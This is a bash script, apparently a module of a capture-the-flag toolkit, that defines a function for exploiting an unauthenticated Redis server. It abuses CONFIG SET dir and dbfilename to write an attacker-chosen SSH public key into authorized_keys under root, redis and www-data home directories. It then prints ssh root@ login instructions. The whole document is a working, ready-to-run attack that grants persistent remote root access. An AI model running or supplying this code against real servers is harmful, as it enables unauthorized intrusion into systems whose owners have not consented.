#!/bin/bash

# Source common functions
source "$(dirname "$0")/common.sh"

# Inject SSH key
function inject_ssh_key() {
  echo -e "${BLUE}[*]${NC} Injecting SSH key for access..."
  
  # Common SSH directories to try
  local SSH_DIRS=("/root/.ssh" "/home/redis/.ssh" "/var/lib/redis/.ssh" "/home/www-data/.ssh")
  local SSH_FILENAME="authorized_keys"
  
  echo -e "${YELLOW}Select SSH key source:${NC}"
  echo "1. Use existing key (~/.ssh/id_rsa.pub)"
  echo "2. Generate new key pair"
  echo "3. Enter custom public key"
  read -p "Enter choice (1-3): " key_choice

  case $key_choice in
    1)
      if [ ! -f ~/.ssh/id_rsa.pub ]; then
        echo -e "${RED}[-]${NC} SSH public key not found at ~/.ssh/id_rsa.pub"
        return 1
      fi
      SSH_KEY=$(cat ~/.ssh/id_rsa.pub)
      ;;
    2)
      echo -e "${BLUE}[*]${NC} Generating new SSH key pair..."
      ssh-keygen -t rsa -b 2048 -f ./ctf_key -N "" -C "ctf@redis"
      SSH_KEY=$(cat ./ctf_key.pub)
      echo -e "${GREEN}[+]${NC} Generated key pair: ./ctf_key and ./ctf_key.pub"
      ;;
    3)
      read -p "Enter your public key: " SSH_KEY
      if [ -z "$SSH_KEY" ]; then
        echo -e "${RED}[-]${NC} No key provided. Exiting."
        return 1
      fi
      ;;
    *)
      echo -e "${RED}[-]${NC} Invalid choice."
      return 1
      ;;
  esac

  echo -e "${YELLOW}Trying common SSH directories...${NC}"
  
  for SSH_DIR in "${SSH_DIRS[@]}"; do
    echo -e "${BLUE}[*]${NC} Trying directory: $SSH_DIR"
    
    if redis_cmd CONFIG SET dir "$SSH_DIR" >/dev/null 2>&1; then
      if redis_cmd CONFIG SET dbfilename "$SSH_FILENAME" >/dev/null 2>&1; then
        if echo -en "\n\n$SSH_KEY\n\n" | redis_cmd -x SET ssh_key >/dev/null 2>&1; then
          if redis_cmd SAVE >/dev/null 2>&1; then
            echo -e "${GREEN}[+]${NC} SSH key injected successfully!"
            echo -e "${GREEN}[+]${NC} Directory: $SSH_DIR"
            echo -e "${GREEN}[+]${NC} Try logging in with: ssh root@$HOST"
            if [ "$key_choice" = "2" ]; then
              echo -e "${GREEN}[+]${NC} Use private key: ssh -i ./ctf_key root@$HOST"
            fi
            return 0
          fi
        fi
      fi
    fi
  done
  
  echo -e "${RED}[-]${NC} Failed to inject SSH key in any directory"
  return 1
}